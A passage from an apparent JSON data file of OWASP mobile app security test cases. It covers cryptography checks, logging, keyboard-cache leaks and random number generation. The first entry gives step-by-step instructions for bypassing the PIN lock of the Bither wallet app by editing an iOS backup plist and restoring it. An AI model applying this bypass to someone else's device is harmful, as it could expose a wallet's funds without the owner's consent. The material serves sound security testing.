wallet app, <a href=\"https://github.com/bither/bither-ios\" rel=\"noopener noreferrer\" target=\"_blank\">Bither ↗</a>, you'll see that it's possible to configure a PIN to lock the UI. And after a few easy steps, you will see how to bypass this UI lock with a modified backup on a non-jailbroken device.</p><p>After you enable the pin, use iMazing to perform a device backup:</p><ol><li>Select your device from the list under the <strong>AVAILABLE</strong> menu.</li><li>Click the top menu option <strong>Back Up</strong>.</li><li>Follow prompts to complete the backup using defaults.</li></ol><p>Next you can open the backup to view app container files within your target app:</p><ol><li>Select your device and click <strong>Backups</strong> on the top right menu.</li><li>Click the backup you created and select <strong>View</strong>.</li><li>Navigate to the Bither app from the <strong>Apps</strong> directory.</li></ol><p>At this point you can view all the backed up content for Bither.</p><p>This is where you can begin parsing through the files looking for sensitive data. In the screenshot you'll see the net.bither.plist file which contains the pin_code attribute. To remove the UI lock restriction, simply delete the pin_code attribute and save the changes.</p><p>From there it's possible to easily restore the modified version of net.bither.plist back onto the device using the licensed version of iMazing.</p><p>The free workaround, however, is to find the plist file in the obfuscated backup generated by iTunes/Finder. So create your backup of the device with Bither's PIN code configured. Then, using the steps described earlier, find the backup directory and grep for \"pin_code\" as shown below.</p><pre>$ ~/Library/Application Support/MobileSync/Backup/&lt;UDID&gt;\n$ grep -iRn \"pin_code\" .\nBinary file ./13/135416dd5f251f9251e0f07206277586b7eac6f6 matches\n</pre><p>You'll see there was a match on a binary file with an obfuscated name. This is your net.bither.plist file. Go ahead and rename the file giving it a plist extension so Xcode can easily open it up for you.</p><p>Again, remove the pin_code attribute from the plist and save your changes. Rename the file back to the original name (i.e., without the plist extension) and perform your backup restore. When the restore is complete you'll see that Bither no longer prompts you for the PIN code when launched.</p>",
        "code": "MASTG-TEST-0058",
        "sort_order": 15
    },
    {
        "tags":
        [
            "MASTG-TEST-0015: Testing the Purposes of Keys"
        ],
        "testcase": "Testing the Purposes of Keys",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Identify all instances where cryptography is used. You can look for:</p><ul><li>classes Cipher, Mac, MessageDigest, Signature</li><li>interfaces Key, PrivateKey, PublicKey, SecretKey</li><li>functions getInstance, generateKey</li><li>exceptions KeyStoreException, CertificateException, NoSuchAlgorithmException</li><li>classes importing java.security.*, javax.crypto.*, android.security.*, android.security.keystore.*</li></ul><p>For each identified instance, identify its purpose and its type. It can be used:</p><ul><li>for encryption/decryption - to ensure data confidentiality</li><li>for signing/verifying - to ensure integrity of data (as well as accountability in some cases)</li><li>for maintenance - to protect keys during certain sensitive operations (such as being imported to the KeyStore)</li></ul><p>Additionally, you should identify the business logic which uses identified instances of cryptography.</p><p>During verification the following checks should be performed:</p><ul><li>are all keys used according to the purpose defined during its creation? (it is relevant to KeyStore keys, which can have KeyProperties defined)</li><li>for asymmetric keys, is the private key being exclusively used for signing and the public key encryption?</li><li>are symmetric keys used for multiple purposes? A new symmetric key should be generated if it's used in a different context.</li><li>is cryptography used according to its business purpose?</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>You can use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> on cryptographic methods to determine input / output values such as the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from. For example, monitor the file system by using the <a href=\"https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security#8-api-monitor---android-only\" rel=\"noopener noreferrer\" target=\"_blank\">API monitor ↗</a> of <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0037\" rel=\"noopener noreferrer\" target=\"_blank\"> RMS Runtime Mobile Security</a></em>.</p>",
        "code": "MASTG-TEST-0015",
        "sort_order": 19
    },
    {
        "tags":
        [
            "MASTG-TEST-0053: Checking Logs for Sensitive Data"
        ],
        "testcase": "Checking Logs for Sensitive Data",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Use the following keywords to check the app's source code for predefined and custom logging statements:</p><ul><li>For predefined and built-in functions:<ul><li>NSLog</li><li>NSAssert</li><li>NSCAssert</li><li>fprintf</li></ul></li><li>For custom functions:<ul><li>Logging</li><li>Logfile</li></ul></li></ul><p>A generalized approach to this issue is to use a define to enable NSLog statements for development and debugging, then disable them before shipping the software. You can do this by adding the following code to the appropriate PREFIX_HEADER (*.pch) file:</p><pre>#ifdef DEBUG\n#   define NSLog (...) NSLog(__VA_ARGS__)\n#else\n#   define NSLog (...)\n#endif\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>See <em><a href=\"https://mas.owasp.org/MASTG-TECH-0060\" rel=\"noopener noreferrer\" target=\"_blank\"> Monitoring System Logs</a></em> and once you're set up, navigate to a screen that displays input fields that take sensitive user information.</p><p>After starting one of the methods, fill in the input fields. If sensitive data is displayed in the output, the app fails this test.</p>",
        "code": "MASTG-TEST-0053",
        "sort_order": 13
    },
    {
        "tags":
        [
            "MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache"
        ],
        "testcase": "Finding Sensitive Data in the Keyboard Cache",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><ul><li>Search through the source code for similar implementations, such as</li></ul><pre>  textObject.autocorrectionType = UITextAutocorrectionTypeNo;\n  textObject.secureTextEntry = YES;\n</pre><ul><li>Open xib and storyboard files in the Interface Builder of Xcode and verify the states of Secure Text Entry and Correction in the Attributes Inspector for the appropriate object.</li></ul><p>The application must prevent the caching of sensitive information entered into text fields. You can prevent caching by disabling it programmatically, using the textObject.autocorrectionType = UITextAutocorrectionTypeNo directive in the desired UITextFields, UITextViews, and UISearchBars. For data that should be masked, such as PINs and passwords, set textObject.secureTextEntry to YES.</p><pre>UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];\ntextField.autocorrectionType = UITextAutocorrectionTypeNo;\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>If a jailbroken iPhone is available, execute the following steps:</p><ol><li>Reset your iOS device keyboard cache by navigating to Settings &gt; General &gt; Reset &gt; Reset Keyboard Dictionary.</li><li>Use the application and identify the functionalities that allow users to enter sensitive data.</li><li>Retrieve the keyboard cache file with the extension .dat from the following directory and its subdirectories (which might be different for iOS versions before 8.0) by <em><a href=\"https://mas.owasp.org/MASTG-TECH-0052\" rel=\"noopener noreferrer\" target=\"_blank\"> Accessing the Device Shell</a></em>: /private/var/mobile/Library/Keyboard/</li><li>Look for sensitive data, such as username, passwords, email addresses, and credit card numbers. If the sensitive data can be obtained via the keyboard cache file, the app fails this test.</li></ol><pre>UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];\ntextField.autocorrectionType = UITextAutocorrectionTypeNo;\n</pre><p>If you must use a non-jailbroken iPhone:</p><ol><li>Reset the keyboard cache.</li><li>Key in all sensitive data.</li><li>Use the app again and determine whether autocorrect suggests previously entered sensitive information.</li></ol>",
        "code": "MASTG-TEST-0055",
        "sort_order": 14
    },
    {
        "tags":
        [
            "MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms"
        ],
        "testcase": "Testing the Configuration of Cryptographic Standard Algorithms",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Identify all the instances of the cryptographic primitives in code. Identify all custom cryptography implementations. You can look for:</p><ul><li>classes Cipher, Mac, MessageDigest, Signature</li><li>interfaces Key, PrivateKey, PublicKey, SecretKey</li><li>functions getInstance, generateKey</li><li>exceptions KeyStoreException, CertificateException, NoSuchAlgorithmException</li><li>classes which uses java.security.*, javax.crypto.*, android.security.* and android.security.keystore.* packages.</li></ul><p>Identify that all calls to getInstance use default provider of security services by not specifying it (it means AndroidOpenSSL aka Conscrypt). Provider can only be specified in KeyStore related code (in that situation KeyStore should be provided as provider). If other provider is specified it should be verified according to situation and business case (i.e. Android API version), and provider should be examined against potential vulnerabilities.</p><p>Ensure that the best practices outlined in the \"<a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/\" rel=\"noopener noreferrer\" target=\"_blank\">Cryptography for Mobile Apps</a>\" chapter are followed. Look at <a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/#identifying-insecure-andor-deprecated-cryptographic-algorithms\" rel=\"noopener noreferrer\" target=\"_blank\">insecure and deprecated algorithms</a> and <a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/#common-configuration-issues\" rel=\"noopener noreferrer\" target=\"_blank\">common configuration issues</a>.</p><h2></h2><h2>Dynamic Analysis</h2><p>You can use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> on cryptographic methods to determine input / output values such as the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from. For example, monitor the file system by using the <a href=\"https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security#8-api-monitor---android-only\" rel=\"noopener noreferrer\" target=\"_blank\">API monitor ↗</a> of <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0037\" rel=\"noopener noreferrer\" target=\"_blank\"> RMS Runtime Mobile Security</a></em>.</p>",
        "code": "MASTG-TEST-0014",
        "sort_order": 18
    },
    {
        "tags":
        [
            "MASTG-TEST-0204: Insecure Random API Usage"
        ],
        "testcase": "Insecure Random API Usage",
        "details": "<h2>Overview</h2><p>Android apps sometimes use an insecure <a href=\"https://mas.owasp.org/MASTG/0x05e-Testing-Cryptography/#random-number-generation\" rel=\"noopener noreferrer\" target=\"_blank\">pseudorandom number generator (PRNG)</a>, such as <a href=\"https://developer.android.com/reference/java/util/Random\" rel=\"noopener noreferrer\" target=\"_blank\">java.util.Random ↗</a>, which is a linear congruential generator and produces a predictable sequence for any given seed value. As a result, java.util.Random and Math.random() (<a href=\"https://franklinta.com/2014/08/31/predicting-the-next-math-random-in-java/\" rel=\"noopener noreferrer\" target=\"_blank\">the latter ↗</a> simply calls nextDouble() on a static java.util.Random instance) generate reproducible sequences across all Java implementations whenever the same seed is used. This predictability makes them unsuitable for cryptographic or other security-sensitive contexts.</p><p>In general, if a PRNG is not explicitly documented as being cryptographically secure, it should not be used where randomness must be unpredictable. Refer to the <a href=\"https://developer.android.com/privacy-and-security/risks/weak-prng\" rel=\"noopener noreferrer\" target=\"_blank\">Android Documentation ↗</a> and the <a href=\"https://mas.owasp.org/MASTG/0x05e-Testing-Cryptography/#random-number-generation\" rel=\"noopener noreferrer\" target=\"_blank\">\"random number generation\" guide</a> for further details.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool on the app and look for insecure random APIs, or you can use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> to detect the use of such APIs.</li><li>For each of the identified API uses, check if they are used in a security relevant context. You can decompile the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>) and inspect the code (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0023\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Decompiled Java Code</a></em>) to confirm.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where insecure random APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find random numbers generated using those APIs that are used in security-relevant contexts, such as generating passwords or authentication tokens.</p><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Secure Random Number Generator APIs</a></em></li></ul>",
        "code": "MASTG-TEST-0204",
        "sort_order": 20
    },
    {
        "tags":
        [
            "MASTG-TEST-0205: Non-random Sources Usage"
        ],
        "testcase": "Non-random Sources Usage",
        "details": "<h2>Overview</h2><p>Android applications sometimes use non-random sources to generate \"random\" values, leading to potential security vulnerabilities. Common practices include relying on the current time, such as Date().getTime(), or accessing Calendar.MILLISECOND to produce values that are easily guessable and reproducible.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>) tool on the app and look for uses of non-random sources.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where non-random sources are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find security-relevant values, such as passwords or tokens, generated using non-random sources.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Secure Random Number Generator APIs</a></em></li></ul>",
        "code": "MASTG-TEST-0205",
        "sort_order": 21
    },
    {
        "tags":
        [
            "MASTG-TEST-0208: Insufficient Key Sizes"
        ],
        "testcase": "Insufficient Key Sizes",
        "details": "<h2>Overview</h2><p>In this test case, we will look for the use insufficient key sizes in Android apps. To do this, we need to focus on the cryptographic frameworks and libraries that are available in Android and the methods that are used to generate, inspect and manage cryptographic keys.</p><p>The Java Cryptography Architecture (JCA) provides foundational classes for key generation which are often used directly when portability or compatibility with older systems is a concern.</p><ul><li><strong>KeyGenerator</strong>: The <a href=\"https://developer.android.com/reference/javax/crypto/KeyGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">KeyGenerator ↗</a> class is used to generate symmetric keys including AES, DES, ChaCha20 or Blowfish, as well as various HMAC keys. The key size can be specified using the <a href=\"https://developer.android.com/reference/javax/crypto/KeyGenerator#init(int)\" rel=\"noopener noreferrer\" target=\"_blank\">init(int keysize) ↗</a> method.</li><li><strong>KeyPairGenerator</strong>: The <a href=\"https://developer.android.com/reference/java/security/KeyPairGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">KeyPairGenerator ↗</a> class is used for generating key pairs for asymmetric encryption (e.g., RSA, EC). The key size can be specified using the <a href=\"https://developer.android.com/reference/java/security/KeyPairGenerator#initialize(int)\" rel=\"noopener noreferrer\" target=\"_blank\">initialize(int keysize) ↗</a> method.</li></ul><p>For more information you can consult the MASTG section about <a href=\"https://mas.owasp.org/MASTG/0x05e-Testing-Cryptography/#key-generation\" rel=\"noopener noreferrer\" target=\"_blank\">\"Key Generation\"</a>.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> on the code and look for uses of the cryptographic functions that generate keys.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where insufficient key lengths are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the use of insufficient key sizes within the source code. For example, a 1024-bit key size is considered insufficient for RSA encryption and a 128-bit key size is considered insufficient for AES encryption considering quantum computing attacks.</p>",
        "code": "MASTG-TEST-0208",
        "sort_order": 22
    },
    {
        "tags":
        [
            "MASTG-TEST-0211: Broken Hashing Algorithms"
        ],
        "testcase": "Broken Hashing Algorithms",
        "details": "<h2>Overview</h2><p>To test for the use of broken hashing algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform hashing operations.</p><ul><li><strong>CommonCrypto</strong>: <a href=\"https://web.archive.org/web/20240606000312/https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonDigest.h\" rel=\"noopener noreferrer\" target=\"_blank\">CommonDigest.h ↗</a> defines the following <strong>hashing algorithms</strong>:<ul><li>CC_MD2</li><li>CC_MD4</li><li>CC_MD5</li><li>CC_SHA1</li><li>CC_SHA224</li><li>CC_SHA256</li><li>CC_SHA384</li><li>CC_SHA512</li></ul></li><li><strong>CryptoKit</strong>: Supports three cryptographically secure <strong>hashing algorithms</strong> and two insecure ones in a dedicated class called <a href=\"https://developer.apple.com/documentation/cryptokit/insecure\" rel=\"noopener noreferrer\" target=\"_blank\">Insecure ↗</a>:<ul><li>SHA256</li><li>SHA384</li><li>SHA512</li><li>Insecure.MD5</li><li>Insecure.SHA1</li></ul></li></ul><p>Note: the <strong>Security</strong> framework only supports asymmetric algorithms and is therefore out of scope for this test.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary, or use a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em>, and look for uses of the cryptographic functions that perform hashing operations.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the disassembled code of the functions using the relevant cryptographic functions.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the use of broken hashing algorithms within the source code. For example:</p><ul><li>MD5</li><li>SHA-1</li></ul><p><strong>Stay up-to-date</strong>: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from <a href=\"https://csrc.nist.gov/pubs/ir/8547/ipd\" rel=\"noopener noreferrer\" target=\"_blank\">NIST IR 8547 \"Transition to Post-Quantum Cryptography Standards\", 2024 ↗</a>.</p><p><strong>Context Considerations</strong>:</p><p>To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.</p><p>For example, using the broken algorithm MD5 for hashing passwords is disallowed by NIST, as it is no longer considered secure for cryptographic purposes. However, using MD5 for checksums or other non-cryptographic tasks, where security is not a concern, is generally acceptable.</p>",
        "code": "MASTG-TEST-0211",
        "sort_order": 29
    },
    {
        "tags":
        [
            "MASTG-TEST-0232: Broken Symmetric Encryption Modes"
        ],
        "testcase": "Broken Symmetric Encryption Modes",
        "details": "<h2>Overview</h2><p>To test for the <a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/#broken-block-cipher-modes\" rel=\"noopener noreferrer\" target=\"_blank\">use of broken encryption modes</a> in Android apps, we need to focus on methods from cryptographic frameworks and libraries that are used to configure and apply encryption modes.</p><p>In Android development, the Cipher class from the Java Cryptography Architecture (JCA) is the primary API that allows you to specify the encryption mode for cryptographic operations. <a href=\"https://developer.android.com/reference/javax/crypto/Cipher#getInstance(java.lang.String)\" rel=\"noopener noreferrer\" target=\"_blank\">Cipher.getInstance ↗</a> defines the transformation string, which includes the encryption algorithm, mode of operation, and padding scheme. The general format is \"Algorithm/Mode/Padding\". For example:</p><pre>Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n</pre><p>In this test we're going to focus on symmetric encryption modes such as <a href=\"https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)\" rel=\"noopener noreferrer\" target=\"_blank\">ECB (Electronic Codebook) ↗</a>.</p><p>ECB (defined in <a href=\"https://csrc.nist.gov/pubs/sp/800/38/a/final\" rel=\"noopener noreferrer\" target=\"_blank\">NIST SP 800-38A ↗</a>) is generally discouraged <a href=\"https://csrc.nist.gov/news/2023/decision-to-revise-nist-sp-800-38a\" rel=\"noopener noreferrer\" target=\"_blank\">see NIST announcement in 2023 ↗</a> due to its inherent security weaknesses. While not explicitly prohibited, its use is limited and advised against in most scenarios. ECB is a block cipher mode that operate deterministically, dividing plaintext into blocks and encrypting them separately, which reveals patterns in the ciphertext. This makes it vulnerable to attacks like <a href=\"https://en.wikipedia.org/wiki/Known-plaintext_attack\" rel=\"noopener noreferrer\" target=\"_blank\">known-plaintext attacks ↗</a> and <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\" rel=\"noopener noreferrer\" target=\"_blank\">chosen-plaintext attacks ↗</a>.</p><p>For example, the following transformations are all <a href=\"https://support.google.com/faqs/answer/10046138?hl=en\" rel=\"noopener noreferrer\" target=\"_blank\">considered vulnerable ↗</a>:</p><ul><li>\"AES\" (uses AES/ECB mode by <a href=\"https://docs.oracle.com/javase/6/docs/technotes/guides/security/crypto/CryptoSpec.html#Cipher\" rel=\"noopener noreferrer\" target=\"_blank\">default ↗</a>)</li><li>\"AES/ECB/NoPadding\"</li><li>\"AES/ECB/PKCS5Padding\"</li><li>\"AES/ECB/ISO10126Padding\"</li></ul><p>You can learn more about ECB and other modes in <a href=\"https://csrc.nist.gov/pubs/sp/800/38/a/final\" rel=\"noopener noreferrer\" target=\"_blank\">NIST SP 800-38A - Recommendation for Block Cipher Modes of Operation: Methods and Techniques ↗</a>. Also check the <a href=\"https://csrc.nist.gov/news/2023/decision-to-revise-nist-sp-800-38a\" rel=\"noopener noreferrer\" target=\"_blank\">Decision to Revise NIST SP 800-38A, Recommendation for Block Cipher Modes of Operation: Methods and Techniques ↗</a> and <a href=\"https://nvlpubs.nist.gov/nistpubs/ir/2024/NIST.IR.8459.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">NIST IR 8459 Report on the Block Cipher Modes of Operation in the NIST SP 800-38 Series ↗</a> for the latest information.</p><p><strong>Out of Scope</strong>: Asymmetric encryption modes like RSA are out of scope for this test because they don't use block modes like ECB.</p><p>In the transformation strings like \"RSA/ECB/OAEPPadding\" or \"RSA/ECB/PKCS1Padding\", the inclusion of ECB in this context is misleading. Unlike symmetric ciphers, <strong>RSA doesn't operate in block modes like ECB</strong>. The ECB designation is a <a href=\"https://github.com/openjdk/jdk/blob/680ac2cebecf93e5924a441a5de6918cd7adf118/src/java.base/share/classes/com/sun/crypto/provider/RSACipher.java#L126\" rel=\"noopener noreferrer\" target=\"_blank\">placeholder in some cryptographic APIs ↗</a> and doesn't imply that RSA uses ECB mode. Understanding these nuances helps prevent false positives.</p><h2></h2><h2>Steps</h2><ol><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> on the app binary, or use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> (dynamic analysis) with a tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em>, and look for cryptographic functions specifying the encryption mode to insecure modes.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where broken encryption modes are used in cryptographic operations.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any broken modes are identified in the app.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0005\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Secure Encryption Modes</a></em></li></ul>",
        "code": "MASTG-TEST-0232",
        "sort_order": 25
    },
    {
        "tags":
        [
            "MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code"
        ],
        "testcase": "Use of Hardcoded Cryptographic Keys in Code",
        "details": "<h2>Overview</h2><p>In this test case, we will look for the use of hardcoded keys in Android applications. To do this, we need to focus on the cryptographic implementations of hardcoded keys. The Java Cryptography Architecture (JCA) provides the <a href=\"https://developer.android.com/reference/javax/crypto/spec/SecretKeySpec\" rel=\"noopener noreferrer\" target=\"_blank\">SecretKeySpec ↗</a> class, which allows you to create a <a href=\"https://developer.android.com/reference/javax/crypto/SecretKey\" rel=\"noopener noreferrer\" target=\"_blank\">SecretKey ↗</a> from a byte array.</p><h2></h2><h2>Steps</h2><ol><li>Use either <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> or <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> (dynamic analysis) with a tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em> to identify all the instances of symmetric key encryption in code and look for uses of the hardcoded cryptographic keys.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where hardcoded keys are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you find any hardcoded keys that are used in security-sensitive contexts.</p>",
        "code": "MASTG-TEST-0212",
        "sort_order": 23
    },
    {
        "tags":
        [
            "MASTG-TEST-0063: Testing Random Number Generation"
        ],
        "testcase": "Testing Random Number Generation",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>In Swift, the <a href=\"https://developer.apple.com/reference/security/1399291-secrandomcopybytes\" rel=\"noopener noreferrer\" target=\"_blank\">SecRandomCopyBytes API ↗</a> is defined as follows:</p><pre>func SecRandomCopyBytes(_ rnd: SecRandomRef?,\n                      _ count: Int,\n                      _ bytes: UnsafeMutablePointer&lt;UInt8&gt;) -&gt; Int32\n</pre><p>The <a href=\"https://developer.apple.com/reference/security/1399291-secrandomcopybytes?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">Objective-C version ↗</a> is</p><pre>int SecRandomCopyBytes(SecRandomRef rnd, size_t count, uint8_t *bytes);\n</pre><p>The following is an example of the APIs usage:</p><pre>int result = SecRandomCopyBytes(kSecRandomDefault, 16, randomBytes);\n</pre><p>Note: if other mechanisms are used for random numbers in the code, verify that these are either wrappers around the APIs mentioned above or review them for their secure-randomness. Often this is too hard, which means you can best stick with the implementation above.</p><h2></h2><h2>Dynamic Analysis</h2><p>If you want to test for randomness, you can try to capture a large set of numbers and check with <a href=\"https://portswigger.net/burp/documentation/desktop/tools/sequencer\" rel=\"noopener noreferrer\" target=\"_blank\">Burp's sequencer plugin ↗</a> to see how good the quality of the randomness is.</p>",
        "code": "MASTG-TEST-0063",
        "sort_order": 26
    },
    {
        "tags":
        [
            "MASTG-TEST-0221: Broken Symmetric Encryption Algorithms"
        ],
        "testcase": "Broken Symmetric Encryption Algorithms",
        "details": "<h2>Overview</h2><p>To test for the <a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/#identifying-insecure-andor-deprecated-cryptographic-algorithms\" rel=\"noopener noreferrer\" target=\"_blank\">use of broken encryption algorithms</a> in Android apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.</p><ul><li><a href=\"https://developer.android.com/reference/javax/crypto/Cipher#getInstance(java.lang.String)\" rel=\"noopener noreferrer\" target=\"_blank\">Cipher.getInstance ↗</a>: Initializes a Cipher object for encryption or decryption. The algorithm parameter can be one of the <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#Cipher\" rel=\"noopener noreferrer\" target=\"_blank\">supported algorithms ↗</a>.</li><li><a href=\"https://developer.android.com/reference/javax/crypto/SecretKeyFactory#getInstance(java.lang.String)\" rel=\"noopener noreferrer\" target=\"_blank\">SecretKeyFactory.getInstance ↗</a>: Returns a SecretKeyFactory object that converts keys into key specifications and vice versa. The algorithm parameter can be one of the <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#SecretKeyFactory\" rel=\"noopener noreferrer\" target=\"_blank\">supported algorithms ↗</a>.</li><li><a href=\"https://developer.android.com/reference/javax/crypto/KeyGenerator#getInstance(java.lang.String)\" rel=\"noopener noreferrer\" target=\"_blank\">KeyGenerator.getInstance ↗</a>: Returns a KeyGenerator object that generates secret keys for symmetric algorithms. The algorithm parameter can be one of the <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#KeyGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">supported algorithms ↗</a>.</li></ul><p>Some broken symmetric encryption algorithms include:</p><ul><li><strong>DES (Data Encryption Standard)</strong>: 56-bit key, breakable, <a href=\"https://csrc.nist.gov/pubs/fips/46-3/final\" rel=\"noopener noreferrer\" target=\"_blank\">withdrawn by NIST in 2005 ↗</a>.</li><li><strong>3DES (Triple DES, officially the Triple Data Encryption Algorithm (TDEA or Triple DEA))</strong>: 64-bit block size, <a href=\"https://sweet32.info/\" rel=\"noopener noreferrer\" target=\"_blank\">vulnerable to Sweet32 birthday attacks ��</a>, <a href=\"https://csrc.nist.gov/pubs/sp/800/67/r2/final\" rel=\"noopener noreferrer\" target=\"_blank\">withdrawn by NIST on January 1, 2024 ↗</a>.</li><li><strong>RC4</strong>: Predictable key stream, allows plaintext recovery <a href=\"https://www.rc4nomore.com/\" rel=\"noopener noreferrer\" target=\"_blank\">RC4 Weakness ↗</a>, disapproved by <a href=\"https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-52r1.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">NIST ↗</a> in 2014 and prohibited by <a href=\"https://datatracker.ietf.org/doc/html/rfc7465\" rel=\"noopener noreferrer\" target=\"_blank\">IETF ↗</a> in 2015.</li><li><strong>Blowfish</strong>: 64-bit block size, <a href=\"https://en.wikipedia.org/wiki/Birthday_attack\" rel=\"noopener noreferrer\" target=\"_blank\">vulnerable to Sweet32 attacks ↗</a>, never FIPS-approved, and listed under <a href=\"https://csrc.nist.gov/csrc/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp2092.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">\"Non-Approved algorithms\" in FIPS ↗</a>.</li></ul><p>Android also provides additional guidance on <a href=\"https://developer.android.com/privacy-and-security/risks/broken-cryptographic-algorithm\" rel=\"noopener noreferrer\" target=\"_blank\">broken cryptographic algorithms ↗</a>.</p><h2></h2><h2>Steps</h2><ol><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" 